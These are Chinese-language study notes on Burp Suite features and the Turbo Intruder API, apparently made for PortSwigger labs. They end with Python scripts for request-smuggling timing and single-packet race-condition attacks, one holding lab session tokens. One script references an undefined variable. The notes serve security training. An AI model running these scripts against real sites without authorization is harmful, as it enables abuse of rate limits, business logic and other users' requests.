https://github.com/PortSwigger/turbo-intruder/tree/master

## 综合

Burp 工具 tips：
- 攻击器
    - 高亮提取位置功能在爆破前后均可用。即，可对爆破后的结果进行高亮提取，而无需设置新提取位置后再次爆破
    - 不同于集束炸弹模式的所有载荷交叉组合。平行叉模式仅平行对应载荷节的载荷，直到其中一个载荷节耗尽载荷，请求数量为所有载荷节中的最小载荷数量
    - 集束炸弹模式下设置第二个载荷为 NULL 型 N 次，等效于重复第一个载荷 N 次

- 宏
    - 录制前置宏后，攻击器将自动提取前置宏字段更新当前请求

- 重复器
    - 对于请求走私，一组中设置3个标签，对于攻击、被劫持的普通请求、清理末尾的普通请求
    - 修改 HTTP/2 的各种（伪）头部：在查看器面板中选择“请求头部”栏

    - 要强制 Burp Repeater 使用 HTTP/2，以便您可以手动测试此配置错误：

        1. 从 **Settings** 对话框中，转到 **Tools > Repeater**。
        2. 在 **Connections** 下，启用 **Allow HTTP/2 ALPN override** 选项。
        3. 在 Repeater 中，转到 **Inspector** 面板并展开 **Request attributes** 部分。
        4. 使用开关将 **Protocol** 设置为 **HTTP/2**。Burp 现在将在此选项卡上使用 HTTP/2 发送所有请求，无论服务器是否通告支持此协议。

- logger
    - 查看扩展探测请求

JWT 编辑器
- 安装 JWT 编辑器扩展后，发送到重复器，在请求界面的 JWT 标签对 JWT 进行编辑

队列投毒
- 在攻击器设置 null 载荷的无限自动请求
- 在重复器手动设置攻击请求后发送，查看攻击器的响应

特殊字符
- `Shift Enter` 组合键输入 `\r\n` 

在 burp 的网络设置中关闭优先 HTTP/2（此时各种模块不会尝试升级连接到 HTTP/2）

设置构造请求后，在浏览器中请求。此时可设置为宏（宏似乎仅可选历史记录请求）

burp 代理的 chrome 无法用来测试客户端 JS 载荷，必然失败。应当使用未被代理的浏览器

burp 的内置 chrome 仍可开启未被代理的普通 chromium
- 打开内置 chrome 后，在桌面的任务栏右键，选择 chromium（非新窗口/任务/标签）。此时可看到 chromium 的位置


Param Miner 
- issues 显示的请求响应内容可能不匹配。需在 issues 或扩展的输出界面报告简略探测结果时，于 logger 中搜索对应项目以查看实际请求响应，或手动测试
- 选择“Add static/dynamic cache buster”和“Include cache busters in headers”选项。然后，它会自动在你使用 Burp 手动测试工具发送的任何请求中，将缓存破坏器添加到常见的键控头中。

浏览器 DOM 插件
- 使用功能后新窗口对应特定功能开关，若在查看汇的窗口继续其他 lab，或导致由于设置仅聚焦汇（隐藏源），导致无任何发现

## 增强攻击器

https://github.com/PortSwigger/turbo-intruder/blob/master/docs/index.md


核心结构
```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           engine=Engine.THREADED)

    for word in open('/usr/share/dict/words'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    table.add(req)
```

### RequestEngine() —— 请求引擎构造方法

- `endpoint=target.endpoint`
    端点: "protocol://host:port"

- `concurrentConnections=5`
    并行连接数

- `requestsPerConnection=100`
    每个连接的请求数

- `engine=Engine.THREADED`
    引擎类型

- `pipeline=[True|N]`
    读取响应之前发送所有请求，或每 N 个请求读取

### engine —— 请求引擎实例

- `engine.openGate('race1')` 
    发送竞争条件特定 gate 内设置的所有请求

- `engine.queue()` 
    设置请求

### engine.queue —— 设置请求

在请求模板中设置 `%s` 作为注入点

- `template=target.req`
    字符串型模板，使用载荷填充占位符 `%s`。通常使用发送到扩展的请求 `target.req`

- `payloads`
    用来填充模板占位符的载荷：单个值、列表、无
    - `"$randomplz"`
        特殊载荷：随机10个字符的字母数字字符串

- `gate=race1`
    设置竞争条件的 gate 名称

- `pauseMarker=[]` 
    暂停字符序列的列表
- `pauseTime=1000` 
    暂停的持续时间，单位毫秒
- `pauseBefore` 
    暂停偏移量
    
### table —— 结果表格

- `table.add(req)`
    添加请求到结果表格

### req —— 请求对象属性

### 示例

```py
# 请求走私 - 前后端超时差异
def queueRequests(target, wordlists):
    # RequestEngine 参数
    ## concurrentConnections=1 线程数量
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=1,
                        requestsPerConnection=100,
                        pipeline=False,
                        engine=Engine.THREADED
                        )
    

    # queue 参数：
    ## pauseMarker 暂停字符序列的列表
    ## pauseTime 暂停的持续时间，以毫秒为单位
    ## pauseBefore 暂停偏移量
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=1000)

    # burp 的 python 为 2.x 版本，此时无 fstring 语法
    followUp = 'GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n'.format(target_host=target_host)
    engine.queue(followUp)

# 将所有响应记录到结果表中
def handleResponse(req, interesting):
    table.add(req)
```

```py
# 竞争条件 - 单包攻击
def queueRequests(target, wordlists):

    # 如果目标支持 HTTP/2，使用 engine=Engine.BURP2 触发单数据包攻击
    # 如果仅支持 HTTP/1，则使用 Engine.THREADED 或 Engine.BURP
    # 更多信息请参阅 https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=1,
                        engine=Engine.BURP2
                        )

    # 'gate' 参数会暂存每个请求，直到调用 openGate 时才统一发送
    # 如果看到负的时间戳，说明服务器在请求完成之前就已响应
    for i in xrange(60):
        engine.queue(target.req, gate='race1')

    # 所有标记为 'race1' 的请求入队后，调用 engine.openGate() 同步发送
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

```py
# 竞争条件 - 不同会话单包攻击
for attempt in range(999):
    currentAttempt = str(attempt)

    engine.queue(target.req, ['G4llv6wvkjzgAisuzUmztGsUpXgIqd9P','DfAAdRTMx4gklnsHQT8DOd2qpQ0SJAUG', 'wiener'], gate=currentAttempt)
    engine.queue(target.req, ['MuX7yC9GLNNAtF86SPoXgjjMt0xQurJX', 'Gv9MBH4UsNsSWsnFdPVlUQ7Puf8PkyRo', 'carlos'], gate=currentAttempt)
    
    engine.openGate(currentAttempt)
```
- 预期请求模板在 `cookie/csrf令牌/用户名` 3处设置 `%s` 占位符
